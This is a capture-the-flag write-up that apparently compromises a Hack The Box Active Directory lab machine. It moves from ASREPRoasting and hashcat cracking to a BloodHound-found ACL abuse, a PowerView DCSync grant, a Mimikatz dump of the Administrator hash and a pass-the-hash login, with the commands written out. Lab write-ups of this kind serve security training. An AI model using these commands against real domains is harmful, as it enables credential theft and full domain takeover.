### Enumeration
We start off with a nmap scan, using default scripts (-sC), and the enumerating versions flags (-sV).
```

<br />

By this nmap scan, we can see that that this machine is an Active Directory Domain Controller. We can attempt to enumerate Domain user accounts if SMB anonymous bindings are enabled. So we run `enum4linux`.

<br />

<br />

We aquire quite a few users from `enum4linux`, which we can use to leverage an attack.

<br />

### Exploitation
We can build a wordlist of Domain usernames to test if accounts are ASREP-Roastable. An ASREPRoasting attack leverages an accounts lack of Kerberos pre-authentication required, giving us the users hash.

We can build the text file users.txt like so:
```
sebastien
lucinda
svc-alfresco
andy
mark
santi
zeus
```

<br />

and utilize it in an ASREPRoasting attack with `impacket-GetNPUsers`:

<br />

<br />

We get a hash for the user svc-alfresco! The naming convention `svc` indicates a service account, meaning potentially more privilege being given to this account.

We can then attempt to crack the hash using hashcat, with the command: `hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule`:

<br />

<br />

Boom! We cracked the service account hash!
Great, now due to the WinRM service running on port 5985 that we enumerated earlier with nmap, we could potentially gain command execution if the service user is in the local group “Remote Management Users”.

<br />

<br />

We get command execution!

<br />

### Privilege Escalation

As a Domain user, or a service account, I like to execute BloodHound on the target the enumerate potential domain vulnerabilities like Kerberoasting, or permission misconfiguration.


We find that the Domain Group `Account Operators` as `Generic All` access on `zeus`, and `svc-alfresco` is a part of the `Privileged Accounts` Domain Group, and the `Privileged Accounts` Domain Group is a member of the `Account Operators` Group. Because of this, our current user has full control over the user `zeus`. We can change their password, set them apart from the `Remote Management Users` to get RCE, then give them DCSync rights. 

<br />

<br />

<br />

```
net localgroup "Remote Management Users" htb.local\zeus /add
```
<br />

Utilize PowerView to give Zeus DCSync rights

<br />

```
. .\PowerView.ps1
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('HTB\zeus', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -PrincipalIdentity zeus -Rights DCSync
```

<br />

Then we can use Evil-WinRM once more to gain access to the `zeus` account

<br />

<br />

We can then use Mimikatz to preform the DCSync procedure as `zeus`.

```
Mimikatz.exe "lsadump::dcsync /domain:htb.local /user:Administrator" "exit"
```
<br />

<br />

And we've gathered the NTLM hash of the Administrator, we can use this to Pass the Hash (PtH) to the Domain Administrator with evil-winrm.

```
evil-winrm -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```
